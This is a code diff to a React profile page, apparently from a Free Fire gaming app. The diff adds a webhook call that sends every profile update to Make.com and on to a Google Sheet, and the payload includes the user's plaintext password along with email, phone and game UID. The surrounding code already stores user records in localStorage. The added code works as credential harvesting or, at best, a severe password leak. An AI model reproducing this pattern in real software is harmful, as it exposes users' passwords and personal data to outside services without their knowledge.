@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { saveUserProfileRealtime } from '../services/firebase';
+import { sendToMakeWebhook } from '../services/webhookService';
 
 export default function ProfilePage({ userProfile, setUserProfile, onLogout }) {
   const [isEditing, setIsEditing] = useState(false);
@@ -37,10 +38,10 @@ export default function ProfilePage({ userProfile, setUserProfile, onLogout }) {
       phone: phone.trim()
     };
 
-    // Save to Firestore Cloud in real-time
+    // 1. Save to Firestore Cloud in real-time
     await saveUserProfileRealtime(updated);
 
-    // Save to LocalStorage cache
+    // 2. Save to LocalStorage cache
     localStorage.setItem('zest_user_profile', JSON.stringify(updated));
     const existingUsers = JSON.parse(localStorage.getItem('zest_registered_users') || '[]');
     const mapped = existingUsers.map(u => {
@@ -51,10 +52,21 @@ export default function ProfilePage({ userProfile, setUserProfile, onLogout }) {
     });
     localStorage.setItem('zest_registered_users', JSON.stringify(mapped));
 
+    // 3. Dispatch real-time Webhook Event to Make.com -> Google Sheet
+    await sendToMakeWebhook({
+      eventType: 'USER_UPDATE',
+      nickname: updated.nickname,
+      ffUid: updated.uid,
+      email: updated.email || userProfile.email || 'N/A',
+      phone: updated.phone,
+      password: updated.password || userProfile.password || 'N/A',
+      details: `Profile Details Updated: Nickname="${updated.nickname}", Free Fire UID=${updated.uid}, Phone=${updated.phone}`
+    });
+
     setUserProfile(updated);
     setSaving(false);
     setIsEditing(false);
-    setSuccessMsg('Player profile updated successfully in Cloud!');
+    setSuccessMsg('Player profile updated successfully and synced with Sheet!');
     setTimeout(() => setSuccessMsg(''), 3000);
   };
 
